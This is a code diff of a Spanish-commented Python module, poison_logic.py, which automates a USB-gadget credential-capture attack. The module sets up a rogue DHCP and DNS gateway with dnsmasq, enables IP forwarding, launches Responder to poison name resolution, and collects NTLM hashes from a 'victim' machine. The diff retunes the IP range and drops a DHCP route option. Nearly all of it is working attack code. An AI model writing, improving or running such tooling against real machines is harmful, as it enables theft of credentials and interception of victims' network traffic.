@@ -1,4 +1,4 @@
-# poison_logic.py (reemplazar completamente)
+# poison_logic.py (versión con corrección de rango IP y DHCP)
 import os
 import subprocess
 import time
@@ -8,9 +8,6 @@ import glob
 
 class PoisonAttack:
     def __init__(self, interface=None, callback_consola=None, session_dir=None):
-        """
-        interface: si es None, se detecta automáticamente la interfaz USB gadget.
-        """
         self.interface = interface or self._detectar_interfaz_gadget()
         self.callback = callback_consola
         self.session_dir = session_dir
@@ -28,30 +25,26 @@ class PoisonAttack:
             print(texto_limpio)
 
     def _detectar_interfaz_gadget(self):
-        """Busca la primera interfaz de red que tenga dirección MAC de gadget USB."""
+        """Busca la interfaz de red que actúa como gadget USB (RNDIS/ECM)."""
         try:
-            # Las interfaces gadget suelen tener nombres como enx... o usb0
             for iface in os.listdir('/sys/class/net/'):
                 if iface == 'lo':
                     continue
-                # Leer el tipo de interfaz (para gadget suele ser 1 o 772)
                 type_path = f'/sys/class/net/{iface}/type'
                 if os.path.exists(type_path):
                     with open(type_path) as f:
                         iface_type = f.read().strip()
+                    # Tipo 1 = Ethernet normal, 772 = gadget Ethernet
                     if iface_type == '772' or iface.startswith('usb') or iface.startswith('enx'):
-                        # Verificamos que tenga dirección MAC (gadget activo)
                         if os.path.exists(f'/sys/class/net/{iface}/address'):
                             return iface
-            # Fallback: si existe usb0, lo usamos
             if os.path.exists('/sys/class/net/usb0'):
                 return 'usb0'
         except Exception:
             pass
-        return 'usb0'  # último recurso
+        return 'usb0'  # fallback
 
     def _limpiar_procesos_previos(self):
-        """Mata cualquier instancia anterior de dnsmasq/responder en nuestra interfaz."""
         os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
         os.system("sudo pkill -f responder > /dev/null 2>&1")
         os.system(f"sudo fuser -k 53/udp > /dev/null 2>&1")
@@ -59,7 +52,6 @@ class PoisonAttack:
         time.sleep(1)
 
     def start(self):
-        """Lanza el ataque y bloquea hasta que se detenga o termine."""
         self._limpiar_procesos_previos()
         iface = self.interface
 
@@ -67,33 +59,34 @@ class PoisonAttack:
         self.log(f"[*] Configurando interfaz: {iface}")
 
         try:
-            # Desvincular de NetworkManager
             self.log("[*] Desvinculando interfaz de NetworkManager...")
             os.system(f"sudo nmcli device set {iface} managed no > /dev/null 2>&1")
 
-            self.log("[*] Levantando interfaz de red...")
+            self.log("[*] Levantando interfaz...")
             os.system(f"sudo ip link set {iface} up")
             time.sleep(3)
 
-            # Asignación de IP estática
-            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 > /dev/null 2>&1")
-            self.log(f"[*] Asignando IP estática local a {iface}...")
-            os.system(f"sudo ip addr flush dev {iface}")
-            os.system(f"sudo ip addr add 1.0.0.1/8 dev {iface}")
+            # Nueva IP privada estándar (192.168.10.1/24)
+            ip = "192.168.10.1"
+            subnet_mask = "24"
+            ip_range = "192.168.10.10,192.168.10.250,255.255.255.0,12h"
 
-            # Rutas
+            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 > /dev/null 2>&1")
+            self.log(f"[*] Asignando IP estática {ip}/{subnet_mask} a {iface}...")
+            os.system(f"sudo ip addr flush dev {iface}")
+            os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface}")
+
             self.log("[*] Inyectando rutas estáticas...")
-            os.system(f"sudo ip route add 1.0.0.0/8 dev {iface} 2>/dev/null")
-            os.system(f"sudo ip route add 224.0.0.0/4 dev {iface} 2>/dev/null")
+            # Ruta para la subred local
+            os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
             os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
 
-            # Configurar dnsmasq (DHCP)
+            # Configuración de dnsmasq SIN option 121
             config_dhcp = (
                 f"interface={iface}\n"
-                f"dhcp-range=1.0.0.10,1.0.0.250,255.0.0.0,12h\n"
-                f"dhcp-option=3,1.0.0.1\n"
-                f"dhcp-option=6,1.0.0.1\n"
-                f"dhcp-option=121,0.0.0.0/0,1.0.0.1\n"
+                f"dhcp-range={ip_range}\n"
+                f"dhcp-option=3,{ip}\n"     # gateway
+                f"dhcp-option=6,{ip}\n"     # DNS
                 f"bind-interfaces\n"
             )
             with open("dnsmasq_temp.conf", "w") as f:
@@ -106,7 +99,16 @@ class PoisonAttack:
             )
             time.sleep(2)
 
-            # Buscar el binario de Responder
+            # Verificar que dnsmasq está escuchando
+            try:
+                ss_output = subprocess.check_output("sudo ss -tulnp | grep dnsmasq", shell=True, text=True)
+                self.log("[+] dnsmasq está escuchando en:")
+                for line in ss_output.splitlines():
+                    self.log(f"    {line.strip()}")
+            except:
+                self.log("[!] No se pudo verificar dnsmasq, revisa manualmente")
+
+            # Lanzar Responder con la misma IP
             if os.path.exists("/usr/share/responder/Responder.py"):
                 comando = ["sudo", "python3", "/usr/share/responder/Responder.py", "-I", iface, "-wvF"]
             elif os.path.exists("/opt/Responder/Responder.py"):
@@ -115,7 +117,9 @@ class PoisonAttack:
                 comando = ["sudo", "responder", "-I", iface, "-wvF"]
 
             self.log(f"[+] INTERFAZ LISTA: {iface}")
+            self.log(f"[+] IP: {ip}/{subnet_mask}")
             self.log(f"[+] OBJETIVO: Captura de tráfico y hashes NTLM")
+            self.log(f"[+] Conecta ahora la víctima al puerto USB")
 
             self.proc_responder = subprocess.Popen(
                 comando,
@@ -125,7 +129,6 @@ class PoisonAttack:
                 bufsize=1
             )
 
-            # Bucle de lectura que respeta el evento de parada
             while not self.stop_event.is_set():
                 linea = self.proc_responder.stdout.readline()
                 if not linea and self.proc_responder.poll() is not None:
@@ -139,7 +142,6 @@ class PoisonAttack:
             self._cleanup()
 
     def _cleanup(self):
-        """Detiene procesos, restaura red y guarda logs."""
         self.log("\n[*] Deteniendo procesos y restaurando red...")
         if self.dns_proc:
             try:
@@ -164,12 +166,9 @@ class PoisonAttack:
         if os.path.exists("dnsmasq_temp.conf"):
             os.remove("dnsmasq_temp.conf")
 
-        # Guardado de logs de Responder en la carpeta de sesión
         if self.session_dir:
             self.log(f"[*] Organizando evidencia en: {os.path.basename(self.session_dir)}")
             os.makedirs(self.session_dir, exist_ok=True)
-
-            # Mover logs de Responder (si existen)
             for log_dir in ["/usr/share/responder/logs", "/opt/Responder/logs"]:
                 if os.path.isdir(log_dir):
                     for f in glob.glob(os.path.join(log_dir, "*")):
@@ -177,14 +176,11 @@ class PoisonAttack:
                             os.rename(f, os.path.join(self.session_dir, os.path.basename(f)))
                         except:
                             subprocess.run(["sudo", "mv", f, self.session_dir], stderr=subprocess.DEVNULL)
-
-            # Asegurar permisos
             subprocess.run(["sudo", "chmod", "-R", "777", self.session_dir], stderr=subprocess.DEVNULL)
 
         self.log("[+] Sistema restaurado. ¡Cacería finalizada!")
 
     def stop(self):
-        """Ordena detener el ataque desde fuera del hilo."""
         self.stop_event.set()
         if self.proc_responder:
             try:
